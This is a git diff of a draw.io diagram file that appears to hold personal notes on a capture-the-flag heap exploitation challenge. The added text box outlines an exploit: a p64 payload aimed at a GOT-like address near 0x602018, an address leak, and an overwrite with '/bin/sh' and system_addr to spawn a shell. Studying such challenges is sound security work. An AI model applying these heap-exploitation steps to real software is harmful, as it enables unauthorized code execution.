@@ -1,11 +1,14 @@
-<mxfile host="app.diagrams.net" modified="2024-04-04T09:48:01.077Z" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" etag="uFi9eqTftGxc0l-WzYRR" version="24.2.1" type="github">
+<mxfile host="app.diagrams.net" modified="2024-04-04T09:50:15.735Z" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" etag="KBPhPTqj5OuDWtyNK5Qp" version="24.2.1" type="github">
   <diagram name="第 1 页" id="erWBEHMT_IxAKbOyUFVJ">
-    <mxGraphModel dx="890" dy="426" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
+    <mxGraphModel dx="432" dy="231" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
         <mxCell id="IB8mfc5W1hkk9r3mwRGL-1" value="一共有5个方法：&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;func1 malloc(0x60)&lt;/div&gt;&lt;div&gt;func2 read&amp;nbsp; 0x40&lt;/div&gt;&lt;div&gt;func3 print&lt;/div&gt;&lt;div&gt;func4 free&lt;/div&gt;&lt;div&gt;func5 malloc 0x60&lt;/div&gt;&lt;div&gt;read 0x60&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;" style="text;strokeColor=none;align=center;fillColor=none;html=1;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
           <mxGeometry x="30" y="10" width="240" height="160" as="geometry" />
+        </mxCell>
+        <mxCell id="IB8mfc5W1hkk9r3mwRGL-2" value="add()&lt;div&gt;free()&lt;/div&gt;&lt;div&gt;edit()&lt;/div&gt;&lt;div&gt;add()&lt;/div&gt;&lt;div&gt;func5&amp;nbsp;b&#39;aaa&#39;+p64(0)*3+p64(0x602018-8)+p64(0)*4 &amp;nbsp;&lt;/div&gt;&lt;div&gt;show&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;edit(b&#39;/bin/sh\x00&#39;+p64(system_addr))&lt;br&gt;&lt;/div&gt;&lt;div&gt;free&lt;/div&gt;" style="text;strokeColor=none;align=center;fillColor=none;html=1;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="310" y="170" width="280" height="170" as="geometry" />
         </mxCell>
       </root>
     </mxGraphModel>
